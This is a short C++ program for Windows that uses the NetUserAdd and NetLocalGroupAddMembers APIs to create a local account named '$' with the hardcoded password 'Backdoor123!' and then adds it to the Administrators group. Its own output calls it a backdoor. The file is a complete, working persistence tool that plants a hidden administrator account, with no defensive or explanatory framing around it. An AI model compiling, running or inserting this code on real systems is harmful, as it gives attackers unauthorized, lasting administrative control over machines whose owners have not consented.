#include <iostream>
#include <windows.h>
#include <LM.h>
#pragma comment(lib,"Netapi32.lib")

using namespace std;
wstring name = L"$";
LPWSTR lpName = const_cast<wchar_t*>(name.c_str());
wstring password = L"Backdoor123!";
LPWSTR lpPassword = const_cast<wchar_t*>(password.c_str());
DWORD adduserStatus;
DWORD errorInStruct;
wstring adminGroup = L"Administrators";

int main()
{
    _USER_INFO_1 userinfo;
    userinfo.usri1_name = lpName;
    userinfo.usri1_password = lpPassword;
    userinfo.usri1_password_age = 0;
    userinfo.usri1_priv = USER_PRIV_USER;
    userinfo.usri1_home_dir = NULL;
    userinfo.usri1_comment = NULL;
    userinfo.usri1_flags = UF_NORMAL_ACCOUNT;
    userinfo.usri1_script_path = NULL;
    _LOCALGROUP_MEMBERS_INFO_3 localgroupinfo;
    localgroupinfo.lgrmi3_domainandname = lpName;
    adduserStatus = NetUserAdd(NULL, 1, (LPBYTE)&userinfo, &errorInStruct);
    if (!adduserStatus)
    {
        cout << "User $ with Password Backdoor123 successfully added \n";
        cout << "adding $ to admin group now..\n";
    }
    else
    {
        cout << "something went wrong... error code ";
        cout << adduserStatus;
        return -1;
    }
    
    adduserStatus = NetLocalGroupAddMembers(NULL, adminGroup.c_str(),3,(LPBYTE)&localgroupinfo,1);
    if (!adduserStatus)
    {
        cout << "User added to admin group! \n";
    }
    else
    {
        cout << "something went wrong... error code ";
        cout << adduserStatus;
        cout << "error in struct code: " << errorInStruct;
        return -1;
    }
    
}
